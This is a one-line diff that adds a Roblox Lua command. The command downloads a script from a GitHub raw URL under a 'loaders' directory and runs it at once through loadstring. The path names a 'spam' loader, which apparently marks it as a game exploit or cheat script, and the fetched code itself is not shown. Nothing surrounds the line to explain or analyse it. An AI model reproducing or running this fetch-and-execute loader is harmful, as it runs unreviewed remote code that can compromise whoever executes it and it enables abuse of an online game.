@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/huss-valley-spam1-z5wokl4liw9t7h.lua"))()
